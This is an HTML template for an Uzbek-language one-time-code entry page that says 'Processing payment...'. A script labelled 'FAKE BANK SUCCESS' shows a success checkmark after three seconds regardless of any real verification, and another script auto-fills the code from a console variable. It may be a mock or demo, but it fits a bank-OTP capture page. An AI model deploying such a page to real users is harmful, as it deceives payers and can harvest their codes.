<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">

<style>

body{
font-family:Inter;
background:#0f172a;
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

/* CARD */
.box{
background:rgba(255,255,255,0.05);
padding:40px;
border-radius:20px;
backdrop-filter:blur(20px);
width:350px;
text-align:center;
}

/* INPUT */
input{
width:100%;
padding:14px;
border:none;
border-radius:10px;
margin-top:15px;
font-size:18px;
text-align:center;
letter-spacing:4px;
}

/* BTN */
button{
margin-top:20px;
width:100%;
padding:14px;
border:none;
border-radius:12px;
background:#22c55e;
color:white;
font-weight:600;
cursor:pointer;
}

/* LOADING */
.loading{
display:none;
margin-top:15px;
}

.spinner{
width:30px;
height:30px;
border:4px solid #ccc;
border-top:4px solid #22c55e;
border-radius:50%;
animation:spin 1s linear infinite;
margin:auto;
}

@keyframes spin{
100%{transform:rotate(360deg);}
}

/* SUCCESS */
.success{
display:none;
font-size:50px;
color:#22c55e;
margin-top:15px;
}

</style>
</head>

<body>

<div class="box">

<h2>🔐 Kodni kiriting</h2>

<form method="POST" onsubmit="showLoading()">
{% csrf_token %}

<input id="otpInput" name="code" maxlength="6" placeholder="------">

<button type="submit">Tasdiqlash</button>

</form>

<div class="loading">
<div class="spinner"></div>
<p>Processing payment...</p>
</div>

<div class="success">✅</div>

</div>

<script>

// 🔥 AUTO FILL (console dan)
setInterval(()=>{
    if(window.lastOTP){
        document.getElementById("otpInput").value = window.lastOTP;
    }
},1000)

// 🔥 LOADING
function showLoading(){
document.querySelector(".loading").style.display="block";
}

// 🔥 FAKE BANK SUCCESS
setTimeout(()=>{
document.querySelector(".loading").style.display="none";
document.querySelector(".success").style.display="block";
},3000)

</script>

</body>
</html>
